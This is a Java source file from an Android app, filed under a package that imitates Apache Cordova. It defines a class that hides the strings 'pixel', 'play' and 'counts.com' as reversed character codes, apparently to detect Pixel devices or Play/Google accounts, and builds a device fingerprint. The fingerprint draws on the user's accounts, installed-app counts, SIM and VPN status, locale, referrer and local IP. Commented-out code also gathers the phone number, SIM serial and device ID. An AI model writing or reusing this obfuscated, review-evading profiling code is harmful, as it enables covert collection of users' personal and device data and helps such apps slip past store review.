package org.apache.cordova;


import android.annotation.SuppressLint;
import android.content.Context;
import android.provider.Settings;

import com.walhalla.stelth.R;
import com.walhalla.ui.DLog;

import org.apache.cordova.constants.TableField;
import org.apache.cordova.generated.P;
import org.apache.cordova.utils.Utils;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.TreeMap;

public class Chipper {

    /**
     * buffer handler
     */

    private static final String NONE = "@";


    public static boolean pixel(String s) {
        char[] node = new char[]{
                108/*l*/, 101/*e*/, 120/*x*/, 105/*i*/, 112/*p*/    //pixel
        };
        String aa = new StringBuilder((String.valueOf(node))).reverse().toString();
        return s.toLowerCase().contains(aa);
    }

    public static boolean aEquals(String s) {

//        char[] node = new char[]{
//                121, 97, 108, 112    //play
//        };
//
//        String aa = new StringBuilder((String.valueOf(node))).reverse().toString();
//        return s.toLowerCase().contains(aa);


        char[] node = new char[]{
                121, 97, 108, 112,    //play [0,4]
                109, 111, 99, 46, 115, 116, 110, 117, 111, 99,    //counts.com [4,14]

        };

        return s.toLowerCase().contains(aaa(node, 0, 4))
                || s.toLowerCase().contains(aaa(node, 4, 14));
    }

    private static String aaa(char[] node, int a, int b) {
        //DLog.d("chipper::" + new StringBuilder((String.valueOf(Arrays.copyOfRange(node, a, b)))).reverse());
        return new StringBuilder((String.valueOf(Arrays.copyOfRange(node, a, b)))).reverse().toString();
    }

    @SuppressLint("HardwareIds")
    public static String android_id(Context context) {
        try {
            return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            return "None";
        }
    }


    //public static String getMachine(Context context)

    public static Map<String, Object> makeFingerPrint00(Context context, TPreferences preferences, String userAgentString) {
        Map<String, Object> map = new TreeMap<>();
//        TelephonyManager service = (TelephonyManager) context.getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
//        map.put("_phone_number", NONE + service.getLine1Number());//p333
//        map.put("_sim_serial_number", NONE + service.getSimSerialNumber());
//        map.put("_device_id", NONE + service.getDeviceId());
//        map.put("_operator", NONE + service.getNetworkOperator());

        //List<String> accounts1 = preferences.getAccounts();
        String accounts1 = preferences.getAccounts();
        setIfNoneNull(map, P.HKEY_USERS, accounts1);
        String deepLink = preferences.getDeeplink();
        String ref = preferences.getReferrer();

        //List<String> nonSys = getNonSystemApps(context, packages);
        map.put("app_stat", preferences.getSetNonSysAppsTotal() + "/"
                + preferences.getTotallApps());
//        map.put("app", nonSys);

        //GpStatus
        //GpVersion
        //map.put("screenLockType", new screenLockType().getCurrent()
        map.put(Cst.Firebase.KEY_SIM_CARD, preferences.getSimSupport());
        map.put(Cst.Firebase.KEY_VPN, preferences.getVpn());

        map.put(Cst.Firebase.KEY_COUNTRY, Utils.getCountryCode(context));
        map.put(Cst.Firebase.KEY_LANG, "" + Locale.getDefault().getLanguage()
                + "_" + Locale.getDefault().getCountry() +
                " [" + Locale.getDefault().getDisplayName() + "]"
                + "::" + context.getString(R.string.default_location));
        //@@@@@@ map.put("android_id", Chipper.android_id(context));
        map.put("time_zone_number", "" + Utils.timeZone());
        map.put(Cst.Firebase.KEY_DEEP_LINK, deepLink);
        map.put(Cst.Firebase.KEY_referer, ref);
        map.put("so", new SystemEnvironment(userAgentString));

        setIfNoneNull(map, Cst.Firebase.KEY_LIP, preferences.getLocalIpAddress());

        String createdAt = Utils.makeDate();
        map.put(TableField.FIELD_CREATE_AT, createdAt);
        map.put(TableField.FIELD_UPDATE_AT, createdAt);
//        //if (BuildConfig.DEBUG) {
//        StringBuilder sb = new StringBuilder();
//        for (Map.Entry<String, Object> entry : map.entrySet()) {
//            sb.append(entry.getValue()).append('|');
//        }
//        DLog.d("fgp " + sb.toString());
//        //}
        return map;
    }

    private static void setIfNoneNull(Map<String, Object> map, String ket, String values) {
        if (ket != null && !ket.isEmpty()) {
            map.put(ket, values);
        }
    }


//    @SuppressLint("MissingPermission")
//    public static Map<String, Object> makeFingerPrint00(Context context, String aa) {
//        Map<String, Object> map = new TreeMap<>();
//
////        TelephonyManager service = (TelephonyManager) context.getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
////        map.put("_phone_number", NONE + service.getLine1Number());//p333
////        map.put("_sim_serial_number", NONE + service.getSimSerialNumber());
////        map.put("_device_id", NONE + service.getDeviceId());
////        map.put("_operator", NONE + service.getNetworkOperator());
//
//
//        List<String> accounts1 = new ArrayList<>();
//        AccountManager am = AccountManager.get(context);
//        try {
//            Account[] accounts = am.getAccounts();
//            //accounts = am.getAccountsByType(null);
//            accounts1 = formatterAccount(accounts);
//
//        } catch (Exception e) {
//            //Log.d(e);
//        }
//        if (!accounts1.isEmpty()) {
//            map.put(P.HKEY_USERS, accounts1);
//        }
//
//
//
//        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context.getApplicationContext());
//        String deepLink = preferences.getString(CH_DEEPLINK, null);
//        String ref = preferences.getString(CH_REFERRER, null);
//
//
//        final PackageManager pm = context.getPackageManager();
//        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
//
//        int total = packages.size();
////        List<String> nonSys = getNonSystemApps(context, packages);
////        map.put("app_stat", nonSys.size() + "/" + total);
////        map.put("app", nonSys);
//
//        //GpStatus
//        //GpVersion
//        //map.put("screenLockType", new screenLockType().getCurrent()
//        map.put(KEY_SIM_CARD, _isSimSupport(context));
//        map.put(KEY_VPN, _useVpn(context));
//
//        map.put(Cst.Firebase.KEY_COUNTRY, Utils.getCountryCode(context));
//        map.put(Cst.Firebase.KEY_LANG, "" + Locale.getDefault().getLanguage()
//                + "_" + Locale.getDefault().getCountry() +
//                " [" + Locale.getDefault().getDisplayName() + "]"
//                + "::" + context.getString(R.string.default_location));
//        //@@@@@@ map.put("android_id", Chipper.android_id(context));
//        map.put("time_zone_number", "" + Utils.timeZone());
//        map.put(Cst.Firebase.KEY_deep_link, deepLink);
//        map.put(Cst.Firebase.KEY_referer, ref);
//        map.put("so", new SystemEnvironment(aa));
//        map.put("LIP", "" + getLocalIpAddress());
//
//        String createdAt = Utils.makeDate();
//        map.put(TableField.FIELD_CREATE_AT, createdAt);
//        map.put(TableField.FIELD_UPDATE_AT, createdAt);
//
////        StringBuilder sb = new StringBuilder();
////        for (Map.Entry<String, String> entry : map.entrySet()) {
////            sb.append(entry.getValue()).append('|');
////        }
////        DLog.d("fgp " + sb.toString());
//        return map;
//    }

//    private static Boolean _useVpn(Context context) {
//        return FraudPhishingChecker.useVpn(context);
//    }
//
//    private static Boolean _isSimSupport(Context context) {
//        return FraudPhishingChecker.isSimSupport(context);
//    }
//
//    private static List<String> _getAccounts(Context context) {
//        return FraudPhishingChecker.getAccounts(context);
//    }
}
